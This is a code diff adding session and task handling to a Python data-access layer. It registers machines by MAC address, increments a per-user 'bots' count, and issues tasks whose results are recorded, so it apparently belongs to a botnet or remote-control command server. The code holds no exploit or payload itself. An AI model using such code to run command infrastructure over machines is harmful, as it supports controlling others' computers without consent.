@@ -40,6 +40,62 @@ class SessionDAO:
             return user.sessions
         return []
 
+    def get_user_sessions_new(self, user_id):
+        user = self.user_dao.get_user(user_id=user_id)
+        new_sessions = []
+        if user:
+            sessions = user.sessions
+            for s in sessions:
+                if s.new:
+                    s.new = False
+                    new_sessions.append(s)
+        db.session.commit()
+        return new_sessions
+    
+    def handle_session(self, session_dict):
+        if not session_dict.get('uid'):
+            identity = str(session_dict['mac_address'] + session_dict['owner']).encode()
+            session_dict['uid'] = hashlib.md5(identity).hexdigest()
+            session_dict['joined'] = datetime.utcnow()
+
+        session_dict['online'] = True
+        session_dict['last_online'] = datetime.utcnow()
+
+        session = self.get_session(session_dict['uid'])
+
+        if not session:
+            user = self.user_dao.get_user(username=session_dict['owner'])
+            if user:
+                sessions = user.sessions
+                if sessions:
+                    session_dict['id'] = 1 + max([s.id for s in sessions])
+                else:
+                    session_dict['id'] = 1
+
+                session = Session(**session_dict)
+                db.session.add(session)
+                user.bots += 1
+                db.session.commit()
+            else:
+                utils.log("User not found: " + session_dict['owner'])
+        else:
+            session.online = True
+            session.last_online = datetime.utcnow()
+            db.session.commit()
+
+        if session:
+            session.new = True
+            session_dict['id'] = session.id
+            db.session.commit()
+        
+        return session_dict
+
+    def update_session_status(self, session_uid, status):
+        session = db.session.query(self.model).filter_by(uid=session_uid).first()
+        if session:
+            session.online = bool(status)
+            db.session.commit()
+
     def delete_session(self, session_uid):
         session = db.session.query(self.model).filter_by(uid=session_uid)
         if session:
@@ -60,6 +116,22 @@ class TaskDAO:
         if session:
             return session.tasks
         return []
+    
+    def handle_task(self, task_dict):
+        if not task_dict.get('uid'):
+            identity = str(str(task_dict.get('session')) + str(task_dict.get('task')) + datetime.utcnow().__str__()).encode()
+            task_dict['uid'] = hashlib.md5(identity).hexdigest()
+            task_dict['issued'] = datetime.utcnow()
+            task = Task(**task_dict)
+            db.session.add(task)
+            task_dict['issued'] = task_dict.get('issued').__str__()
+        else:
+            task = self.get_task(task_dict.get('uid'))
+            if task:
+                task.result = task_dict.get('result')
+                task.completed = datetime.utcnow()
+        db.session.commit()
+        return task_dict
 
 
 class FileDAO:
